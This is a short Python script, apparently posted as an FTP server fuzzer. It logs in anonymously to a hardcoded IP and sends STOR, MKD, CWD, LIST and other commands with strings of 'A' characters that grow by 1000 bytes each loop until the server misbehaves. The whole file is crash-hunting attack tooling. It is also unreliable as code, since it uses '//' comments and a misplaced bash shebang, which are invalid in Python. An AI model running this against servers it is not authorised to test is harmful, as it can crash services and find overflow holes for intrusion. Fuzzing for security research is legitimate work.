# A FTP Server Fuzzer by
# Works only Post authentication  :D
#!/bin/bash/

import sys ,os , socket


fuzz="\x41"*1000

testing=["STOR","XMKD","CWD","USER","MKD","LIST"]//add remove command lists from here


while True:
  for command in testing:
      print "\n Fuzzing using \t "+ command + "\t size:\t " +str(len(fuzz))
      s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
      connect=s.connect(('192.168.79.130',21))// Put I.P. Address Here along with Port
      print "\n"+s.recv(1024)
      s.send('USER anonymous\r\n') // Username
      print "\n"+s.recv(1024)
      s.send('PASS \r\n')// Password
      print  "\n"+s.recv(1024)
      s.send(command+' '+fuzz+'\r\n')
      print  "\n"+s.recv(1024)
      s.send('QUIT\r\n')
      s.close()
      fuzz=fuzz+"\x41"*1000 // Loop to increment by 1000 till something funny happens .
